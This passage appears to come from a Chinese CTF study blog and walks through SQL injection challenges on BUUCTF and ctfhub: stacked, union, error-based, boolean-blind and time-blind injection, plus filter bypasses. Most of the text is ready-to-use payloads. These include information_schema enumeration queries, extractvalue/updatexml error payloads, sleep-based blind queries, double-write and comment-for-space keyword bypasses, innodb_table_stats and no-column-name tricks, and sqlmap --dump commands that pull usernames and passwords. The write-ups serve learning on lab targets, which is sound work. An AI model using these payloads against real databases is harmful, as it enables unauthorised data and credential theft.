alt="image-20210617020541195"></p><p>输入1‘无回显猜测是数字型注入</p><p>用堆叠注入的方式</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210617020708317.png" alt="image-20210617020708317"></p><p>查到存在一个flag表，尝试查看里面的内容</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210617020823449.png" alt="image-20210617020823449"></p><p>大概是被过滤了，只好百度搜wp了</p><p>看到dalao能够猜出后端语句为select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag</p><p>（搜到一篇wp说原环境中存在源码泄露，所以能够知道这部分的sql语言，但是buu的环境里没有[BUUCTF <a href="https://blog.csdn.net/weixin_44037296/article/details/105190639?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param">SUCTF 2019] EasySQL_Senimo-CSDN博客</a>）</p><p><strong>解法一</strong>：输入*,1</p><p>由于||在MySQL中起或的作用，因此1||flag会返回1，也就变成了</p><p>select *,1 from Flag.</p><p>成功找到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210617021123869.png" alt="image-20210617021123869"></p><p>由于select 1 from Flag 是增加一个临时列，它的列名是1，然后那一列的值都为1</p><p>因此在查询的flag后还有一个值为1的临时列</p><p><strong>解法二</strong></p><p>把&quot;||&quot;变成字符串连接符，而不是或。这里涉及到mysql中sql_mode参数设置，设置<code>sql_mode=pipes_as_concat</code>字符就可以设置。</p><p>payload：1;set sql_mode=PIPES_AS_CONCAT;select 1</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210617021450142.png" alt="image-20210617021450142"></p><p>也能获得flag。</p><p>这是查询语句相当于select 1flag from Flag</p><p>(不太懂为啥这样也能查出来，1flag是列名如果Flag表里没有这一列呢？？)</p><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>用到了联合查询</p><p><a href="https://www.cnblogs.com/guoqingsentou/p/13488796.html">原理篇——sql注入2：联合查询注入 - 这太秃然了 - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/weixin_42277564/article/details/80583959">SQL注入之联合查询注入_selecthch的博客-CSDN博客_联合注入</a></p><p>参考一下</p><p>常规步骤</p><p>　            1. 判断注入点</p><p>　　　　2. 判断注入类型（数字型型or字符型）</p><p>　　　　3. 判断字段数</p><p>　　　　4. 判断回显位</p><p>　　　　5. 确定数据库名</p><p>　　　　6. 确定表名</p><p>　　　　7. 确定字段名</p><p>　　　　8. 拿到数据</p><p>1.判断注入点</p><p>​            在输入的用户名后添加单引号返回出错，猜测存在注入</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210617122257987.png" alt="image-20210617122257987"></p><p>2.判断注入类型</p><p>​            在用户名后输入1’ or 1#后成功进入，但还是没有拿到flag，因此继续尝试注入</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210617122350388.png" alt="image-20210617122350388"></p><p>3.判断字段数</p><p>​        当order by 4时出错，因此应有三个字段数</p><p>4.判断回显位</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210617122732266.png" alt="image-20210617122732266"></p><p>5。确定数据库名</p><p>​        为了获取所有数据库名，要利用group_concat()函数令其一次性显示出来</p><pre class="language-none"><code class="language-none">1&#39; union select 1,2,group_concat(database());#</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210617123129571.png" alt="image-20210617123129571"></p><p>6.确定表名</p><pre class="language-none"><code class="language-none">1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database();#</code></pre><p><strong>【INFORMATION_SCHEMA 数据库】</strong> 是MySQL自带的，它提供了访问数据库 <strong>元数据</strong> 的方式。元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。</p><p>常用字段</p><table><thead><tr><th>字段</th><th>含义</th></tr></thead><tbody><tr><td>Table_catalog</td><td>数据表登记目录</td></tr><tr><td>Table_schema</td><td>数据表所属的数据库名</td></tr><tr><td>Table_name</td><td>表名称</td></tr><tr><td>Table_type</td><td>表类型[system view|base table]</td></tr><tr><td>Engine</td><td>使用的数据库引擎[MyISAM|CSV|InnoDB]</td></tr><tr><td>Version</td><td>版本，默认值10</td></tr><tr><td>Row_format</td><td>行格式[Compact|Dynamic|Fixed]</td></tr><tr><td>Table_rows</td><td>表里所存多少行数据</td></tr><tr><td>Avg_row_length</td><td>平均行长度</td></tr><tr><td>Data_length</td><td>数据长度</td></tr><tr><td>Max_data_length</td><td>最大数据长度</td></tr><tr><td>Index_length</td><td>索引长度</td></tr><tr><td>Data_free</td><td>空间碎片</td></tr><tr><td>Auto_increment</td><td>做自增主键的自动增量当前值</td></tr><tr><td>Create_time</td><td>表的创建时间</td></tr><tr><td>Update_time</td><td>表的更新时间</td></tr><tr><td>Check_time</td><td>表的检查时间</td></tr><tr><td>Table_collation</td><td>表的字符校验编码集</td></tr><tr><td>Checksum</td><td>校验和</td></tr><tr><td>Create_options</td><td>创建选项</td></tr><tr><td>Table_comment</td><td>表的注释、备注</td></tr></tbody></table><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210617123612820.png" alt="image-20210617123612820"></p><ol start="7"><li><p>确定字段名</p><p>猜测flag应该在l0ve1ysq1表中，因此查找该表内的字段名</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39;;#</code></pre></li></ol><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210617164130341.png" alt="image-20210617164130341"></p><p>8.拿到数据</p><p>查找这三列中的全部数据，利用group_concat();</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1#;</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210617164638259.png" alt="image-20210617164638259"></p><p>得到flag</p><p><strong>MySQL默认有“information_schema”的数据库，该库中有三个表名：</strong></p><p>1、SCHEMATA：存储该用户创建的所有数据库的库名，记录库名的字段为SCHEMA_NAME。<br>2、TABLES：存储该用户创建的所有数据库的库名和表名，记录库名和表名的字段为TABLE_SCHEMA和TABLE_NAME。<br>3、COLUMNS：存储该用户创建的所有数据库的库名、表名和字段名，库名、表名和字段名为TABLE_SCHEMA、TABLE_NAME和COLUMN_NAME。</p><h2 id="ctfhub—SQL-整数型注入"><a href="#ctfhub—SQL-整数型注入" class="headerlink" title="ctfhub—SQL 整数型注入"></a>ctfhub—SQL 整数型注入</h2><p>输入1有回显</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210617171453199.png" alt="image-20210617171453199"></p><p>输入1 and 1=2无回显，既存在注入点，整数型注入</p><p>利用order by可知存在两个字段</p><p>利用联合查询查询数据库名称</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210617171639524.png" alt="image-20210617171639524"></p><p>再查找表名</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210617171824424.png" alt="image-20210617171824424"></p><p>flag应该就在flag表内，再查找字段名</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210617171902588.png" alt="image-20210617171902588"></p><p>最后得到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210617171939691.png" alt="image-20210617171939691"></p><h2 id="ctfhub—SQL字符型注入"><a href="#ctfhub—SQL字符型注入" class="headerlink" title="ctfhub—SQL字符型注入"></a>ctfhub—SQL字符型注入</h2><p>利用order by判断字段数</p><p>输入-1&#39; union select 1,2#判断回显位置</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210617225730001.png" alt="image-20210617225730001"></p><p>查数据库名</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210617221940482.png" alt="image-20210617221940482"></p><p>查表名</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210617221849032.png" alt="image-20210617221849032"></p><p>查字段名</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210617224854046.png" alt="image-20210617224854046"></p><p>查flag        -1&#39; union select 1,group_concat(flag) from flag#</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210617225605950.png" alt="image-20210617225605950"></p><p>感觉和整数型注入差不多</p><h2 id="ctfhub—报错注入"><a href="#ctfhub—报错注入" class="headerlink" title="ctfhub—报错注入"></a>ctfhub—报错注入</h2><p>利用xpath语法错误来进行报错注入主要利用<code>extractvalue</code>和<code>updatexml</code>两个函数。</p><p><strong>extractvalue()</strong></p><pre class="language-none"><code class="language-none">函数原型：extractvalue(xml_document,Xpath_string)正常语法：extractvalue(xml_document,Xpath_string);第一个参数：xml_document是string格式，为xml文档对象的名称第二个参数：Xpath_string是xpath格式的字符串作用：从目标xml中返回包含所查询值的字符串</code></pre><p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容</p><p>payload模板</p><pre class="language-none"><code class="language-none">&#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e))</code></pre><ol><li>0x7e=’~’</li><li>concat(‘a’,‘b’)=“ab”</li><li>version()=@@version</li><li> ‘~‘可以换成’#’、’$&#39;等不满足xpath格式的字符</li><li> extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位</li></ol><p>返回结果不能超过一条</p><p>若超过则需再查询语句后添加limit x,1或用group_concat()函数</p><p><strong>updatexml()</strong></p><p>updatexml()函数与extractvalue()类似，是更新xml文档的函数。</p><p>and 1=(updataxml(1,concat(0x7e,(sql_inject),0x7e),1))</p><p><strong>flood()</strong></p><p>原理还没看明白（</p><p>先放个模板在这</p><pre class="language-none"><code class="language-none">1 Union select count(*),concat((查询语句),0x26,floor(rand(0)*2))x from information_schema.columns group by x;</code></pre><p><strong>题目：</strong></p><p><strong>利用extractvalue</strong></p><p>输入单引号提示语法错误，输入and 1=1能正确查询，猜测为数字型，利用extractvalue函数爆库名</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210618145637443.png" alt="image-20210618145637443"></p><p>再爆表名</p><p>这里提示太长因此利用group_concat()函数</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210618150129458.png" alt="image-20210618150129458"></p><p>猜到flag再flag表内爆列名</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210618150241862.png" alt="image-20210618150241862"></p><p>最后查询内容</p><p>1 and extractvalue(1,concat(0x7e,(select flag from flag limit 0,1),0x7e))</p><p>由于extractvalue函数只能显示32位字符，所以要利用substring函数进行分割</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210618150615881.png" alt="image-20210618150615881"></p><p>利用substring查看右边31位字符</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210618181313759.png" alt="image-20210618181313759"></p><p>最后可以拿到flag</p><p>ctfhub{ff3bb0327849e1b9e0e6abfd}</p><p><strong>利用updataxml函数</strong></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210618181744673.png" alt="image-20210618181744673"></p><p><strong>利用flood函数</strong></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210618182036292.png" alt="image-20210618182036292"></p><h2 id="ctfhub—布尔盲注"><a href="#ctfhub—布尔盲注" class="headerlink" title="ctfhub—布尔盲注"></a>ctfhub—布尔盲注</h2><p>只有出现数据提交正确和错误两种不同的页面（报错型至少语法错误会回显错误到页面上）或者无法使用联合查询。</p><p><strong>步骤</strong></p><ol><li>用错误和正确两种反馈进行逐一试验，猜测出闭合</li><li>利用length来逐一测试字符串的长度</li><li>利用substr来逐一的测试，测试库名、表名、列名和其他数据</li><li>最后得到数据</li></ol><p>函数</p><pre class="language-none"><code class="language-none">length()返回字符串的长度length(abc)返回3，表示abc字符串长度为3substr()截取字符串substr(abc,1,1)返回a，从abc的第一位开始截取，步长为1mid()取出字符串的一部分值mid(abc,1,1)返回a，从abc的第一位开始取，步长为1，与substr()用法一致left()取出字符串左边的几个数据left(abc,1)返回aleft(abc,2)返回abright()取出右边的几个数据right(abc,1)返回cright(abc,2)返回bcord() 与ascii()返回一个字符的ascii码值ascii(s)返回114hex()返回16进制数</code></pre><p>先猜数据库长度&gt;3时返回成功，&gt;4时返回失败可以得到数据库名长度为4</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210618213033658.png" alt="image-20210618213033658"></p><p>接下来利用substr和ascii函数猜名字</p><p>首字母ascii码大于114时返回成功，大于115时返回失败，可得到首字母的ascii码为115，为s</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210618213347153.png" alt="image-20210618213347153"></p><p>第二位同理可以得到ascii码值为113，为q</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210618213535384.png" alt="image-20210618213535384"></p><p>最后可得数据库名为sqli</p><p>再猜表名</p><p>1 and substr((select table_name from information_schema.tables where table_schema=&#39;sqli&#39; limit 0,1),1,1)=&#39;n&#39;</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210618214343490.png" alt="image-20210618214343490"></p><p>（感觉这部分应该用bp抓包爆破更方便）</p><p>吧limit后的0改为1猜第二个表名</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210618214721333.png" alt="image-20210618214721333"></p><p>最后能得到有news和flag两个表</p><p>再猜字段</p><p>首字母ascii码为102，为f</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210618215609088.png" alt="image-20210618215609088"></p><p>同理能得到字段名为flag</p><p>最后爆内容</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210618222859475.png" alt="image-20210618222859475"></p><p>太多了，用bp爆破完感觉也很难找，估计用py写脚本会方便很多</p><p><strong>用sqlmap：</strong></p><p>-u <a href="http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1">http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1</a> --dbs查库名</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210618224516739.png" alt="image-20210618224516739"></p><p>-u <a href="http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1">http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1</a> -D sqli --tables</p><p>查表名</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210618224721120.png" alt="image-20210618224721120"></p><p>-u <a href="http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1">http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1</a> -D sqli -T flag --columns查字段名</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210618225207129.png" alt="image-20210618225207129"></p><p>-u <a href="http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1">http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1</a> -D sqli -T flag -C flag --dump查值</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210618225706653.png" alt="image-20210618225706653"></p><h2 id="ctfhub—时间盲注"><a href="#ctfhub—时间盲注" class="headerlink" title="ctfhub—时间盲注"></a>ctfhub—时间盲注</h2><p>利用sleep函数进行盲注</p><p>若and之前的语句正确则成功执行sleep</p><p>能得到是数字型注入</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210619153620142.png" alt="image-20210619153620142"></p><p>接下来利用if语句进行注入是否成功的判断1 and if(查询语句,sleep(2),1)</p><p>若为真则执行sleep（2），若为假则执行1</p><p>接下来步骤与布尔盲注相似</p><p>猜数据库名（也可以利用ascii码来猜，但因为ctfhub的sql题名称都一样，就直接试字符了）</p><p>1 and if(substr(database(),1,1)=&#39;s&#39;,sleep(2),1)#</p><p>猜表的数量</p><p>1 and if((select count(table_name) from information_schema.tables  where table_schema=database())=2,sleep(2),1)#</p><p>猜表名</p><p>1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;0,sleep(2),1)#</p><p>将limit后的0改为1再猜第二个表名</p><p>分别为news 和 flag</p><p>猜flag表内字段数量</p><p>1 and if((select count(column_name) from information_schema.columns  where table_name=&#39;flag&#39;)=1,sleep(2),1)#</p><p>猜字段名</p><p>1 and if(ascii(substr((select column_name from information_schema.columns where table_name=&#39;flag&#39; limit 0,1),1,1))&gt;102,sleep(2),1)#</p><p>最终可以猜出字段名为flag</p><p>再猜内容</p><p>1 and if(ascii(substr((select flag from flag limit 0,1),1,1))&gt;99,sleep(2),1)#</p><p>这部分应该还是要用python或者sqlmap</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210619160201466.png" alt="image-20210619160201466"></p><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>看题目就知道空格被过滤了，这里可以利用/**/注释符来替代空格，其他步骤和字符型注入一样</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210620113251958.png" alt="image-20210620113251958"></p><p>最后得到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210620113632138.png" alt="image-20210620113632138"></p><p>贴个别人总结的过滤和绕过</p><p><a href="https://blog.csdn.net/weixin_44300286/article/details/96597167?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">SQL注入一些过滤及绕过总结_obsetear的博客-CSDN博客</a></p><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>看到界面提示存在过滤</p><p>输入1&#39; and 1=1# 1‘ or 1#  1&#39; and select 1 from 1#等语句根据返回的错误信息可以知道过滤了select or and union from by where</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210619173714989.png" alt="image-20210619173714989"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210619173908385.png" alt="image-20210619173908385"></p><p>这里可以利用双写绕过，首先利用order by查字段数可以查到表内有三列</p><p>1&#39; oorrder bbyy 4;#</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210619174055661.png" alt="image-20210619174055661"></p><p>接下来可以利用联合查询</p><p>先看回显1&#39; ununionion selselectect 1,2,3;#</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210619174226243.png" alt="image-20210619174226243"></p><p>查库名1&#39; ununionion selselectect 1,2,database();#</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210619174351658.png" alt="image-20210619174351658"></p><p>查表名</p><p>1&#39; ununionion selselectect 1,2,(selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database());#</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210619174759820.png" alt="image-20210619174759820"></p><p>flag应该在b4bsql表里，爆一下列名</p><p>1&#39; ununionion selselectect 1,2,(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#39;b4bsql&#39;);#</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210619175029086.png" alt="image-20210619175029086"></p><p>最后爆内容1&#39; ununionion selselectect 1,2,(selselectect group_concat(id,username,passwoorrd) frfromom b4bsql);#</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210619175306597.png" alt="image-20210619175306597"></p><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>试了一下，and union 空格 等于都被过滤了尝试了几种绕过姿势都没成功，看了下别人的wp说是报错注入</p><p>利用括号来去掉查询语句中的空格</p><p>先查库</p><p>0&#39;or(extractvalue(1,concat(0x7e,(database()),0x7e)))#</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210619181915074.png" alt="image-20210619181915074"></p><p>再查表</p><p>由于等于号也被过滤了，所以要用like</p><p>admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))),0x7e)))#</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210619184507074.png" alt="image-20210619184507074"></p><p>爆列名</p><p>admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;))),0x7e)))#</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210619184801079.png" alt="image-20210619184801079"></p><p>最后爆内容</p><p>admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e)))#</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210619185705420.png" alt="image-20210619185705420"></p><p>flag{66f2f5cd-207d-4d50-87</p><p>由于extractvalue显示字符数的限制，要用substr函数对其进行分割</p><p>admin&#39;or(extractvalue(1,concat(0x7e,right((select(group_concat(id,username,password))from(H4rDsq1)),31),0x7e)))#</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210619190153350.png" alt="image-20210619190153350"></p><p>cd-207d-4d50-87bd-d8b762ffce95}</p><p>最后拼一下得到flag</p><p>flag{66f2f5cd-207d-4d50-87bd-d8b762ffce95}</p><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>进入后是个登录页面，注册个账号之后登录</p><p>可以知道注入点在广告位上</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210619214559474.png" alt="image-20210619214559474"></p><p>试一下可以知道or and #都被过滤了</p><p>因为过滤了＃号，所以要保证后面的单引号能闭合</p><pre class="language-sql" data-language="sql"><code class="language-sql">0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;‘1’&#x3D;‘1</code></pre><p>得到回显位置2，3.</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210619220207345.png" alt="image-20210619220207345"></p><p><strong>因为or被过滤，且无法通过大小写和双写绕过，那么information_schema因为含有or，所以也没法使用。</strong>这里有两种方法可以绕过</p><p><a href="https://www.cnblogs.com/20175211lyz/p/12358725.html">SQL注入：限制条件下获取表名、无列名注入 - MustaphaMond - 博客园 (cnblogs.com)</a></p><p>InnoDb引擎<br>从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。<br>sys数据库<br>在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取表名。</p><p>sys数据库需要root权限，而innoDb在mysql中默认关闭</p><p>限制：<br><strong>mysql ≥ 5.7版本</strong></p><p>先查一下数据库版本</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210619221524942.png" alt="image-20210619221524942"></p><p>因此可以利用innoDb来查表名</p><p>系统Mysql库中存在两张与innodb相关的表：<code>innodb_table_stats</code>和<code>innodb_index_stats</code>。</p><p>所以可以通过查找这两个表取代information的作用</p><pre class="language-sql" data-language="sql"><code class="language-sql">0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()&amp;&amp;&#39;1&#39;&#x3D;&#39;1</code></pre><p>或</p><pre class="language-sql" data-language="sql"><code class="language-sql">0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_index_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()&amp;&amp;&#39;1&#39;&#x3D;&#39;1</code></pre><p>得到表名为ads和users</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210619223630074.png" alt="image-20210619223630074"></p><p>猜flag在users表内，进行无列名注入</p><p><strong>无列名注入原理</strong></p><p>无列名注入的原理就是在取别名的同时查询数据。通过无列名查询构造一个虚拟表，在构造此表的同时查询其中的数据。</p><p>表的列数也要一次次试</p><p>（不太懂为啥这里的列数不是22)</p><p><a href="https://zhuanlan.zhihu.com/p/98206699">CTF|mysql之无列名注入 - 知乎 (zhihu.com)</a></p><p>[<a href="https://www.cnblogs.com/wangtanzhi/p/12241499.html">SWPU2019]Web1 - 王叹之 - 博客园 (cnblogs.com)</a></p><pre class="language-sql" data-language="sql"><code class="language-sql">0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,(select&#x2F;**&#x2F;group_concat(&#96;3&#96;)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#39;1&#39;&#x3D;&#39;1</code></pre><p>如果反引号被过滤，就要对字段利用别名替代</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210619234252501.png" alt="image-20210619234252501"></p><p><strong>还可以利用join爆列名</strong></p><p>join后的列名是两个表列名加起来的，可能会产⽣相同的列名，如id和name，使⽤别名时，表中不能出现同的字段名，这就跟join第⼀个特点相冲突，所以在join和别名同时使⽤时会导致报错</p><p>当通过查询得到新的表时，必须有一个别名，即每个派生出来的表都必须有一个自己的别名</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p><strong>原理</strong></p><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p><p><strong>二次注入，可以概括为以下两步:</strong></p><ul><li>第一步：插入恶意数据<br> 进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</li><li>第二步：引用恶意数据<br> 开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</li></ul><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210621110912304.png" alt="image-20210621110912304"></p><h2 id="记考核赛的一次sql盲注"><a href="#记考核赛的一次sql盲注" class="headerlink" title="记考核赛的一次sql盲注"></a>记考核赛的一次sql盲注</h2><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/sql/image-20210821170913431.png" alt="image-20210821170913431"></p><p>(strcmp(ascii(substr(REVERSE(tceles)(table_name)from(mysql.innodb_table_stats)where((table_schema)like(database())),1,1)),10000))%23</p><p>||strcmp(ascii(substr((select(table_name)from(mysql.innodb_table_stats))where((database_name)like(database())),1,1)),1)%23</p><p>username=admin&amp;password=||((ascii(mid((pwd)from(1))))like(12))%23</p><p>YouAresOgOoD</p><p>select(table_name)from(information_schema.tables)where(table_schema=database())</p><p>||(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),§1§,1))=§0§)%23</p><p>flag_1s_her3</p><p>||(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666c61675f31735f68657233)),§1§,1))=§0§)%23</p><p>flag{sql1_1s_s0_ea3y}</p>]]></content>
      
      
      
        <tags>
            
            <tag> web学习 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
